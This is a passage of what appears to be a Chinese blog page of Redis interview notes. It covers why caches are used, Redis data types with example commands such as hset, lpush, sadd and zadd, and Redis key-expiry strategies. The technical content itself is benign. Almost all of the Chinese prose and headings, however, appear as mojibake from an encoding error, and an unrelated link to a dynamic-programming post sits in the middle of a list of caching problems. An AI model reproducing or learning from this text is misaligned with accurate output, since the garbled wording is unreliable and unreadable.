href="#hash-%E7%AE%97%E6%B3%95">hash ç®—æ³•</a></li><li><a href="#%E4%B8%80%E8%87%B4%E6%80%A7-hash-%E7%AE%97%E6%B3%95">ä¸€è‡´æ€§ hash ç®—æ³•</a></li><li><a href="#redis-cluster-%E7%9A%84-hash-slot-%E7%AE%97%E6%B3%95">redis cluster çš„ hash slot ç®—æ³•</a></li></ul></li><li><a href="#redis-cluster-%E7%9A%84%E9%AB%98%E5%8F%AF%E7%94%A8%E4%B8%8E%E4%B8%BB%E5%A4%87%E5%88%87%E6%8D%A2%E5%8E%9F%E7%90%86">redis cluster çš„é«˜å¯ç”¨ä¸ä¸»å¤‡åˆ‡æ¢åŸç†</a><ul><li><a href="#%E5%88%A4%E6%96%AD%E8%8A%82%E7%82%B9%E5%AE%95%E6%9C%BA">åˆ¤æ–­èŠ‚ç‚¹å®•æœº</a></li><li><a href="#%E4%BB%8E%E8%8A%82%E7%82%B9%E8%BF%87%E6%BB%A4">ä»èŠ‚ç‚¹è¿‡æ»¤</a></li><li><a href="#%E4%BB%8E%E8%8A%82%E7%82%B9%E9%80%89%E4%B8%BE">ä»èŠ‚ç‚¹é€‰ä¸¾</a></li><li><a href="#%E4%B8%8E%E5%93%A8%E5%85%B5%E6%AF%94%E8%BE%83">ä¸å“¨å…µæ¯”è¾ƒ</a></li></ul></li></ul></li></ul></li><li><a href="#%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84-redis-%E6%98%AF%E6%80%8E%E4%B9%88%E9%83%A8%E7%BD%B2%E7%9A%84">ç”Ÿäº§ç¯å¢ƒä¸­çš„ redis æ˜¯æ€ä¹ˆéƒ¨ç½²çš„ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-8">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-8">é¢è¯•é¢˜å‰–æ</a></li></ul></li></ul><!-- tocstop --><h1><span id="é¡¹ç›®ä¸­ç¼“å­˜æ˜¯å¦‚ä½•ä½¿ç”¨çš„ä¸ºä»€ä¹ˆè¦ç”¨ç¼“å­˜ç¼“å­˜ä½¿ç”¨ä¸å½“ä¼šé€ æˆä»€ä¹ˆåæœ">é¡¹ç›®ä¸­ç¼“å­˜æ˜¯å¦‚ä½•ä½¿ç”¨çš„ï¼Ÿä¸ºä»€ä¹ˆè¦ç”¨ç¼“å­˜ï¼Ÿç¼“å­˜ä½¿ç”¨ä¸å½“ä¼šé€ æˆä»€ä¹ˆåæœï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>è¿™ä¸ªé—®é¢˜ï¼Œäº’è”ç½‘å…¬å¸å¿…é—®ï¼Œè¦æ˜¯ä¸€ä¸ªäººè¿ç¼“å­˜éƒ½ä¸å¤ªæ¸…æ¥šï¼Œé‚£ç¡®å®æ¯”è¾ƒå°´å°¬ã€‚</p><p>åªè¦é—®åˆ°ç¼“å­˜ï¼Œä¸Šæ¥ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œè‚¯å®šæ˜¯å…ˆé—®é—®ä½ é¡¹ç›®å“ªé‡Œç”¨äº†ç¼“å­˜ï¼Ÿä¸ºå•¥è¦ç”¨ï¼Ÿä¸ç”¨è¡Œä¸è¡Œï¼Ÿå¦‚æœç”¨äº†ä»¥åå¯èƒ½ä¼šæœ‰ä»€ä¹ˆä¸è‰¯çš„åæœï¼Ÿ</p><p>è¿™å°±æ˜¯çœ‹çœ‹ä½ å¯¹ç¼“å­˜è¿™ä¸ªä¸œè¥¿èƒŒåæœ‰æ²¡æœ‰æ€è€ƒï¼Œå¦‚æœä½ å°±æ˜¯å‚»ä¹ä¹çš„çç”¨ï¼Œæ²¡æ³•ç»™é¢è¯•å®˜ä¸€ä¸ªåˆç†çš„è§£ç­”ï¼Œé‚£é¢è¯•å®˜å¯¹ä½ å°è±¡è‚¯å®šä¸å¤ªå¥½ï¼Œè§‰å¾—ä½ å¹³æ—¶æ€è€ƒå¤ªå°‘ï¼Œå°±çŸ¥é“å¹²æ´»å„¿ã€‚</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><h3><span id="é¡¹ç›®ä¸­ç¼“å­˜æ˜¯å¦‚ä½•ä½¿ç”¨çš„">é¡¹ç›®ä¸­ç¼“å­˜æ˜¯å¦‚ä½•ä½¿ç”¨çš„ï¼Ÿ</span></h3><p>è¿™ä¸ªï¼Œéœ€è¦ç»“åˆè‡ªå·±é¡¹ç›®çš„ä¸šåŠ¡æ¥ã€‚</p><h3><span id="ä¸ºä»€ä¹ˆè¦ç”¨ç¼“å­˜">ä¸ºä»€ä¹ˆè¦ç”¨ç¼“å­˜ï¼Ÿ</span></h3><p>ç”¨ç¼“å­˜ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªç”¨é€”ï¼š<strong>é«˜æ€§èƒ½</strong>ã€<strong>é«˜å¹¶å‘</strong>ã€‚</p><h4><span id="é«˜æ€§èƒ½">é«˜æ€§èƒ½</span></h4><p>å‡è®¾è¿™ä¹ˆä¸ªåœºæ™¯ï¼Œä½ æœ‰ä¸ªæ“ä½œï¼Œä¸€ä¸ªè¯·æ±‚è¿‡æ¥ï¼Œå­å“§å­å“§ä½ å„ç§ä¹±ä¸ƒå…«ç³Ÿæ“ä½œ mysqlï¼ŒåŠå¤©æŸ¥å‡ºæ¥ä¸€ä¸ªç»“æœï¼Œè€—æ—¶ 600msã€‚ä½†æ˜¯è¿™ä¸ªç»“æœå¯èƒ½æ¥ä¸‹æ¥å‡ ä¸ªå°æ—¶éƒ½ä¸ä¼šå˜äº†ï¼Œæˆ–è€…å˜äº†ä¹Ÿå¯ä»¥ä¸ç”¨ç«‹å³åé¦ˆç»™ç”¨æˆ·ã€‚é‚£ä¹ˆæ­¤æ—¶å’‹åŠï¼Ÿ</p><p>ç¼“å­˜å•Šï¼ŒæŠ˜è…¾ 600ms æŸ¥å‡ºæ¥çš„ç»“æœï¼Œæ‰”ç¼“å­˜é‡Œï¼Œä¸€ä¸ª key å¯¹åº”ä¸€ä¸ª valueï¼Œä¸‹æ¬¡å†æœ‰äººæŸ¥ï¼Œåˆ«èµ° mysql æŠ˜è…¾ 600ms äº†ï¼Œç›´æ¥ä»ç¼“å­˜é‡Œï¼Œé€šè¿‡ä¸€ä¸ª key æŸ¥å‡ºæ¥ä¸€ä¸ª valueï¼Œ2ms æå®šã€‚æ€§èƒ½æå‡ 300 å€ã€‚</p><p>å°±æ˜¯è¯´å¯¹äºä¸€äº›éœ€è¦å¤æ‚æ“ä½œè€—æ—¶æŸ¥å‡ºæ¥çš„ç»“æœï¼Œä¸”ç¡®å®šåé¢ä¸æ€ä¹ˆå˜åŒ–ï¼Œä½†æ˜¯æœ‰å¾ˆå¤šè¯»è¯·æ±‚ï¼Œé‚£ä¹ˆç›´æ¥å°†æŸ¥è¯¢å‡ºæ¥çš„ç»“æœæ”¾åœ¨ç¼“å­˜ä¸­ï¼Œåé¢ç›´æ¥è¯»ç¼“å­˜å°±å¥½ã€‚</p><h4><span id="é«˜å¹¶å‘">é«˜å¹¶å‘</span></h4><p>mysql è¿™ä¹ˆé‡çš„æ•°æ®åº“ï¼Œå‹æ ¹å„¿è®¾è®¡ä¸æ˜¯è®©ä½ ç©å„¿é«˜å¹¶å‘çš„ï¼Œè™½ç„¶ä¹Ÿå¯ä»¥ç©å„¿ï¼Œä½†æ˜¯å¤©ç„¶æ”¯æŒä¸å¥½ã€‚mysql å•æœºæ”¯æ’‘åˆ° <code>2000QPS</code> ä¹Ÿå¼€å§‹å®¹æ˜“æŠ¥è­¦äº†ã€‚</p><p>æ‰€ä»¥è¦æ˜¯ä½ æœ‰ä¸ªç³»ç»Ÿï¼Œé«˜å³°æœŸä¸€ç§’é’Ÿè¿‡æ¥çš„è¯·æ±‚æœ‰ 1ä¸‡ï¼Œé‚£ä¸€ä¸ª mysql å•æœºç»å¯¹ä¼šæ­»æ‰ã€‚ä½ è¿™ä¸ªæ—¶å€™å°±åªèƒ½ä¸Šç¼“å­˜ï¼ŒæŠŠå¾ˆå¤šæ•°æ®æ”¾ç¼“å­˜ï¼Œåˆ«æ”¾ mysqlã€‚ç¼“å­˜åŠŸèƒ½ç®€å•ï¼Œè¯´ç™½äº†å°±æ˜¯ <code>key-value</code> å¼æ“ä½œï¼Œå•æœºæ”¯æ’‘çš„å¹¶å‘é‡è½»æ¾ä¸€ç§’å‡ ä¸‡åå‡ ä¸‡ï¼Œæ”¯æ’‘é«˜å¹¶å‘ so easyã€‚å•æœºæ‰¿è½½å¹¶å‘é‡æ˜¯ mysql å•æœºçš„å‡ åå€ã€‚</p><blockquote><p>ç¼“å­˜æ˜¯èµ°å†…å­˜çš„ï¼Œå†…å­˜å¤©ç„¶å°±æ”¯æ’‘é«˜å¹¶å‘ã€‚</p></blockquote><h3><span id="ç”¨äº†ç¼“å­˜ä¹‹åä¼šæœ‰ä»€ä¹ˆä¸è‰¯åæœ">ç”¨äº†ç¼“å­˜ä¹‹åä¼šæœ‰ä»€ä¹ˆä¸è‰¯åæœï¼Ÿ</span></h3><p>å¸¸è§çš„ç¼“å­˜é—®é¢˜æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><ul><li><p>[ç¼“å­˜ä¸æ•°æ®åº“åŒå†™ä¸ä¸€è‡´]</p></li><li><a href="/2020/03/25/dp/" title="åŠ¨æ€è§„åˆ’é›†åˆ">åŠ¨æ€è§„åˆ’é›†åˆ</a></li><li><p>[ç¼“å­˜é›ªå´©ã€ç¼“å­˜ç©¿é€]</p></li><li><p>[ç¼“å­˜å¹¶å‘ç«äº‰]</p></li></ul><p>åé¢å†è¯¦ç»†è¯´æ˜ã€‚</p><h1><span id="redis-éƒ½æœ‰å“ªäº›æ•°æ®ç±»å‹åˆ†åˆ«åœ¨å“ªäº›åœºæ™¯ä¸‹ä½¿ç”¨æ¯”è¾ƒåˆé€‚">redis éƒ½æœ‰å“ªäº›æ•°æ®ç±»å‹ï¼Ÿåˆ†åˆ«åœ¨å“ªäº›åœºæ™¯ä¸‹ä½¿ç”¨æ¯”è¾ƒåˆé€‚ï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>é™¤éæ˜¯é¢è¯•å®˜æ„Ÿè§‰çœ‹ä½ ç®€å†ï¼Œæ˜¯å·¥ä½œ 3 å¹´ä»¥å†…çš„æ¯”è¾ƒåˆçº§çš„åŒå­¦ï¼Œå¯èƒ½å¯¹æŠ€æœ¯æ²¡æœ‰å¾ˆæ·±å…¥çš„ç ”ç©¶ï¼Œé¢è¯•å®˜æ‰ä¼šé—®è¿™ç±»é—®é¢˜ã€‚å¦åˆ™ï¼Œåœ¨å®è´µçš„é¢è¯•æ—¶é—´é‡Œï¼Œé¢è¯•å®˜å®åœ¨ä¸æƒ³å¤šé—®ã€‚</p><p>å…¶å®é—®è¿™ä¸ªé—®é¢˜ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªåŸå› ï¼š</p><ul><li>çœ‹çœ‹ä½ åˆ°åº•æœ‰æ²¡æœ‰å…¨é¢çš„äº†è§£ redis æœ‰å“ªäº›åŠŸèƒ½ï¼Œä¸€èˆ¬æ€ä¹ˆæ¥ç”¨ï¼Œå•¥åœºæ™¯ç”¨ä»€ä¹ˆï¼Œå°±æ€•ä½ åˆ«å°±ä¼šæœ€ç®€å•çš„ KV æ“ä½œï¼›</li><li>çœ‹çœ‹ä½ åœ¨å®é™…é¡¹ç›®é‡Œéƒ½æ€ä¹ˆç©å„¿è¿‡ redisã€‚</li></ul><p>è¦æ˜¯ä½ å›ç­”çš„ä¸å¥½ï¼Œæ²¡è¯´å‡ºå‡ ç§æ•°æ®ç±»å‹ï¼Œä¹Ÿæ²¡è¯´ä»€ä¹ˆåœºæ™¯ï¼Œä½ å®Œäº†ï¼Œé¢è¯•å®˜å¯¹ä½ å°è±¡è‚¯å®šä¸å¥½ï¼Œè§‰å¾—ä½ å¹³æ—¶å°±æ˜¯åšä¸ªç®€å•çš„ set å’Œ getã€‚</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><p>redis ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§æ•°æ®ç±»å‹ï¼š</p><ul><li>string</li><li>hash</li><li>list</li><li>set</li><li>sorted set</li></ul><h3><span id="string">string</span></h3><p>è¿™æ˜¯æœ€ç®€å•çš„ç±»å‹ï¼Œå°±æ˜¯æ™®é€šçš„ set å’Œ getï¼Œåšç®€å•çš„ KV ç¼“å­˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> college szu</span><br></pre></td></tr></table></figure><h3><span id="hash">hash</span></h3><p>è¿™ä¸ªæ˜¯ç±»ä¼¼ map çš„ä¸€ç§ç»“æ„ï¼Œè¿™ä¸ªä¸€èˆ¬å°±æ˜¯å¯ä»¥å°†ç»“æ„åŒ–çš„æ•°æ®ï¼Œæ¯”å¦‚ä¸€ä¸ªå¯¹è±¡ï¼ˆå‰ææ˜¯<strong>è¿™ä¸ªå¯¹è±¡æ²¡åµŒå¥—å…¶ä»–çš„å¯¹è±¡</strong>ï¼‰ç»™ç¼“å­˜åœ¨ redis é‡Œï¼Œç„¶åæ¯æ¬¡è¯»å†™ç¼“å­˜çš„æ—¶å€™ï¼Œå¯ä»¥å°±æ“ä½œ hash é‡Œçš„<strong>æŸä¸ªå­—æ®µ</strong>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hset person name bingo</span><br><span class="line">hset person age 20</span><br><span class="line">hset person <span class="built_in">id</span> 1</span><br><span class="line">hget person name</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">person = <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bingo&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">20</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3><span id="list">list</span></h3><p>list æ˜¯æœ‰åºåˆ—è¡¨ï¼Œè¿™ä¸ªå¯ä»¥ç©å„¿å‡ºå¾ˆå¤šèŠ±æ ·ã€‚</p><p>æ¯”å¦‚å¯ä»¥é€šè¿‡ list å­˜å‚¨ä¸€äº›åˆ—è¡¨å‹çš„æ•°æ®ç»“æ„ï¼Œç±»ä¼¼ç²‰ä¸åˆ—è¡¨ã€æ–‡ç« çš„è¯„è®ºåˆ—è¡¨ä¹‹ç±»çš„ä¸œè¥¿ã€‚</p><p>æ¯”å¦‚å¯ä»¥é€šè¿‡ lrange å‘½ä»¤ï¼Œè¯»å–æŸä¸ªé—­åŒºé—´å†…çš„å…ƒç´ ï¼Œå¯ä»¥åŸºäº list å®ç°åˆ†é¡µæŸ¥è¯¢ï¼Œè¿™ä¸ªæ˜¯å¾ˆæ£’çš„ä¸€ä¸ªåŠŸèƒ½ï¼ŒåŸºäº redis å®ç°ç®€å•çš„é«˜æ€§èƒ½åˆ†é¡µï¼Œå¯ä»¥åšç±»ä¼¼å¾®åšé‚£ç§ä¸‹æ‹‰ä¸æ–­åˆ†é¡µçš„ä¸œè¥¿ï¼Œæ€§èƒ½é«˜ï¼Œå°±ä¸€é¡µä¸€é¡µèµ°ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0å¼€å§‹ä½ç½®ï¼Œ-1ç»“æŸä½ç½®ï¼Œç»“æŸä½ç½®ä¸º-1æ—¶ï¼Œè¡¨ç¤ºåˆ—è¡¨çš„æœ€åä¸€ä¸ªä½ç½®ï¼Œå³æŸ¥çœ‹æ‰€æœ‰ã€‚</span></span><br><span class="line">lrange mylist 0 -1</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚å¯ä»¥æä¸ªç®€å•çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œä» list å¤´æ€¼è¿›å»ï¼Œä» list å°¾å·´é‚£é‡Œå¼„å‡ºæ¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lpush mylist 1</span><br><span class="line">lpush mylist 2</span><br><span class="line">lpush mylist 3 4 5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">rpop mylist</span><br></pre></td></tr></table></figure><h3><span id="set">set</span></h3><p>set æ˜¯æ— åºé›†åˆï¼Œè‡ªåŠ¨å»é‡ã€‚</p><p>ç›´æ¥åŸºäº set å°†ç³»ç»Ÿé‡Œéœ€è¦å»é‡çš„æ•°æ®æ‰”è¿›å»ï¼Œè‡ªåŠ¨å°±ç»™å»é‡äº†ï¼Œå¦‚æœä½ éœ€è¦å¯¹ä¸€äº›æ•°æ®è¿›è¡Œå¿«é€Ÿçš„å…¨å±€å»é‡ï¼Œä½ å½“ç„¶ä¹Ÿå¯ä»¥åŸºäº jvm å†…å­˜é‡Œçš„ HashSet è¿›è¡Œå»é‡ï¼Œä½†æ˜¯å¦‚æœä½ çš„æŸä¸ªç³»ç»Ÿéƒ¨ç½²åœ¨å¤šå°æœºå™¨ä¸Šå‘¢ï¼Ÿå¾—åŸºäº redis è¿›è¡Œå…¨å±€çš„ set å»é‡ã€‚</p><p>å¯ä»¥åŸºäº set ç©å„¿äº¤é›†ã€å¹¶é›†ã€å·®é›†çš„æ“ä½œï¼Œæ¯”å¦‚äº¤é›†å§ï¼Œå¯ä»¥æŠŠä¸¤ä¸ªäººçš„ç²‰ä¸åˆ—è¡¨æ•´ä¸€ä¸ªäº¤é›†ï¼Œçœ‹çœ‹ä¿©äººçš„å…±åŒå¥½å‹æ˜¯è°ï¼Ÿå¯¹å§ã€‚</p><p>æŠŠä¸¤ä¸ªå¤§ V çš„ç²‰ä¸éƒ½æ”¾åœ¨ä¸¤ä¸ª set ä¸­ï¼Œå¯¹ä¸¤ä¸ª set åšäº¤é›†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-------æ“ä½œä¸€ä¸ªset-------</span></span><br><span class="line"><span class="comment"># æ·»åŠ å…ƒç´ </span></span><br><span class="line">sadd mySet 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å…¨éƒ¨å…ƒç´ </span></span><br><span class="line">smembers mySet</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ¤æ–­æ˜¯å¦åŒ…å«æŸä¸ªå€¼</span></span><br><span class="line">sismember mySet 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤æŸä¸ª/äº›å…ƒç´ </span></span><br><span class="line">srem mySet 1</span><br><span class="line">srem mySet 2 4</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å…ƒç´ ä¸ªæ•°</span></span><br><span class="line">scard mySet</span><br><span class="line"></span><br><span class="line"><span class="comment"># éšæœºåˆ é™¤ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">spop mySet</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------æ“ä½œå¤šä¸ªset-------</span></span><br><span class="line"><span class="comment"># å°†ä¸€ä¸ªsetçš„å…ƒç´ ç§»åŠ¨åˆ°å¦å¤–ä¸€ä¸ªset</span></span><br><span class="line">smove yourSet mySet 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚ä¸¤setçš„äº¤é›†</span></span><br><span class="line">sinter yourSet mySet</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚ä¸¤setçš„å¹¶é›†</span></span><br><span class="line">sunion yourSet mySet</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚åœ¨yourSetä¸­è€Œä¸åœ¨mySetä¸­çš„å…ƒç´ </span></span><br><span class="line">sdiff yourSet mySet</span><br></pre></td></tr></table></figure><h3><span id="sorted-set">sorted set</span></h3><p>sorted set æ˜¯æ’åºçš„ setï¼Œå»é‡ä½†å¯ä»¥æ’åºï¼Œå†™è¿›å»çš„æ—¶å€™ç»™ä¸€ä¸ªåˆ†æ•°ï¼Œè‡ªåŠ¨æ ¹æ®åˆ†æ•°æ’åºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">zadd board 85 zhangsan</span><br><span class="line">zadd board 72 lisi</span><br><span class="line">zadd board 96 wangwu</span><br><span class="line">zadd board 63 zhaoliu</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ’åå‰ä¸‰çš„ç”¨æˆ·ï¼ˆé»˜è®¤æ˜¯å‡åºï¼Œæ‰€ä»¥éœ€è¦ rev æ”¹ä¸ºé™åºï¼‰</span></span><br><span class="line">zrevrange board 0 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æŸç”¨æˆ·çš„æ’å</span></span><br><span class="line">zrank board zhaoliu</span><br></pre></td></tr></table></figure><h1><span id="redis-çš„è¿‡æœŸç­–ç•¥éƒ½æœ‰å“ªäº›å†…å­˜æ·˜æ±°æœºåˆ¶éƒ½æœ‰å“ªäº›æ‰‹å†™ä¸€ä¸‹-lru-ä»£ç å®ç°">redis çš„è¿‡æœŸç­–ç•¥éƒ½æœ‰å“ªäº›ï¼Ÿå†…å­˜æ·˜æ±°æœºåˆ¶éƒ½æœ‰å“ªäº›ï¼Ÿæ‰‹å†™ä¸€ä¸‹ LRU ä»£ç å®ç°ï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>å¦‚æœä½ è¿è¿™ä¸ªé—®é¢˜éƒ½ä¸çŸ¥é“ï¼Œä¸Šæ¥å°±æ‡µäº†ï¼Œå›ç­”ä¸å‡ºæ¥ï¼Œé‚£çº¿ä¸Šä½ å†™ä»£ç çš„æ—¶å€™ï¼Œæƒ³å½“ç„¶çš„è®¤ä¸ºå†™è¿› redis çš„æ•°æ®å°±ä¸€å®šä¼šå­˜åœ¨ï¼Œåé¢å¯¼è‡´ç³»ç»Ÿå„ç§ bugï¼Œè°æ¥è´Ÿè´£ï¼Ÿ</p><p>å¸¸è§çš„æœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p><ul><li>å¾€ redis å†™å…¥çš„æ•°æ®æ€ä¹ˆæ²¡äº†ï¼Ÿ</li></ul><p>å¯èƒ½æœ‰åŒå­¦ä¼šé‡åˆ°ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒçš„ redis ç»å¸¸ä¼šä¸¢æ‰ä¸€äº›æ•°æ®ï¼Œå†™è¿›å»äº†ï¼Œè¿‡ä¸€ä¼šå„¿å¯èƒ½å°±æ²¡äº†ã€‚æˆ‘çš„å¤©ï¼ŒåŒå­¦ï¼Œä½ é—®è¿™ä¸ªé—®é¢˜å°±è¯´æ˜ redis ä½ å°±æ²¡ç”¨å¯¹å•Šã€‚redis æ˜¯ç¼“å­˜ï¼Œä½ ç»™å½“å­˜å‚¨äº†æ˜¯å§ï¼Ÿ</p><p>å•¥å«ç¼“å­˜ï¼Ÿç”¨å†…å­˜å½“ç¼“å­˜ã€‚å†…å­˜æ˜¯æ— é™çš„å—ï¼Œå†…å­˜æ˜¯å¾ˆå®è´µè€Œä¸”æ˜¯æœ‰é™çš„ï¼Œç£ç›˜æ˜¯å»‰ä»·è€Œä¸”æ˜¯å¤§é‡çš„ã€‚å¯èƒ½ä¸€å°æœºå™¨å°±å‡ åä¸ª G çš„å†…å­˜ï¼Œä½†æ˜¯å¯ä»¥æœ‰å‡ ä¸ª T çš„ç¡¬ç›˜ç©ºé—´ã€‚redis ä¸»è¦æ˜¯åŸºäºå†…å­˜æ¥è¿›è¡Œé«˜æ€§èƒ½ã€é«˜å¹¶å‘çš„è¯»å†™æ“ä½œçš„ã€‚</p><p>é‚£æ—¢ç„¶å†…å­˜æ˜¯æœ‰é™çš„ï¼Œæ¯”å¦‚ redis å°±åªèƒ½ç”¨ 10Gï¼Œä½ è¦æ˜¯å¾€é‡Œé¢å†™äº† 20G çš„æ•°æ®ï¼Œä¼šå’‹åŠï¼Ÿå½“ç„¶ä¼šå¹²æ‰ 10G çš„æ•°æ®ï¼Œç„¶åå°±ä¿ç•™ 10G çš„æ•°æ®äº†ã€‚é‚£å¹²æ‰å“ªäº›æ•°æ®ï¼Ÿä¿ç•™å“ªäº›æ•°æ®ï¼Ÿå½“ç„¶æ˜¯å¹²æ‰ä¸å¸¸ç”¨çš„æ•°æ®ï¼Œä¿ç•™å¸¸ç”¨çš„æ•°æ®äº†ã€‚</p><ul><li>æ•°æ®æ˜æ˜è¿‡æœŸäº†ï¼Œæ€ä¹ˆè¿˜å ç”¨ç€å†…å­˜ï¼Ÿ</li></ul><p>è¿™æ˜¯ç”± redis çš„è¿‡æœŸç­–ç•¥æ¥å†³å®šã€‚</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><h3><span id="redis-è¿‡æœŸç­–ç•¥">redis è¿‡æœŸç­–ç•¥</span></h3><p>redis è¿‡æœŸç­–ç•¥æ˜¯ï¼š<strong>å®šæœŸåˆ é™¤+æƒ°æ€§åˆ é™¤</strong>ã€‚</p><p>æ‰€è°“<strong>å®šæœŸåˆ é™¤</strong>ï¼ŒæŒ‡çš„æ˜¯ redis é»˜è®¤æ˜¯æ¯éš” 100ms å°±éšæœºæŠ½å–ä¸€äº›è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„ keyï¼Œæ£€æŸ¥å…¶æ˜¯å¦è¿‡æœŸï¼Œå¦‚æœè¿‡æœŸå°±åˆ é™¤ã€‚</p><p>å‡è®¾ redis é‡Œæ”¾äº† 10w ä¸ª keyï¼Œéƒ½è®¾ç½®äº†è¿‡æœŸæ—¶é—´ï¼Œä½ æ¯éš”å‡ ç™¾æ¯«ç§’ï¼Œå°±æ£€æŸ¥ 10w ä¸ª keyï¼Œé‚£ redis åŸºæœ¬ä¸Šå°±æ­»äº†ï¼Œcpu è´Ÿè½½ä¼šå¾ˆé«˜çš„ï¼Œæ¶ˆè€—åœ¨ä½ çš„æ£€æŸ¥è¿‡æœŸ key ä¸Šäº†ã€‚æ³¨æ„ï¼Œè¿™é‡Œå¯ä¸æ˜¯æ¯éš” 100ms å°±éå†æ‰€æœ‰çš„è®¾ç½®è¿‡æœŸæ—¶é—´çš„ keyï¼Œé‚£æ ·å°±æ˜¯ä¸€åœºæ€§èƒ½ä¸Šçš„<strong>ç¾éš¾</strong>ã€‚å®é™…ä¸Š redis æ˜¯æ¯éš” 100ms <strong>éšæœºæŠ½å–</strong>ä¸€äº› key æ¥æ£€æŸ¥å’Œåˆ é™¤çš„ã€‚</p><p>ä½†æ˜¯é—®é¢˜æ˜¯ï¼Œå®šæœŸåˆ é™¤å¯èƒ½ä¼šå¯¼è‡´å¾ˆå¤šè¿‡æœŸ key åˆ°äº†æ—¶é—´å¹¶æ²¡æœ‰è¢«åˆ é™¤æ‰ï¼Œé‚£å’‹æ•´å‘¢ï¼Ÿæ‰€ä»¥å°±æ˜¯æƒ°æ€§åˆ é™¤äº†ã€‚è¿™å°±æ˜¯è¯´ï¼Œåœ¨ä½ è·å–æŸä¸ª key çš„æ—¶å€™ï¼Œredis ä¼šæ£€æŸ¥ä¸€ä¸‹ ï¼Œè¿™ä¸ª key å¦‚æœè®¾ç½®äº†è¿‡æœŸæ—¶é—´é‚£ä¹ˆæ˜¯å¦è¿‡æœŸäº†ï¼Ÿå¦‚æœè¿‡æœŸäº†æ­¤æ—¶å°±ä¼šåˆ é™¤ï¼Œä¸ä¼šç»™ä½ è¿”å›ä»»ä½•ä¸œè¥¿ã€‚</p><blockquote><p>è·å– key 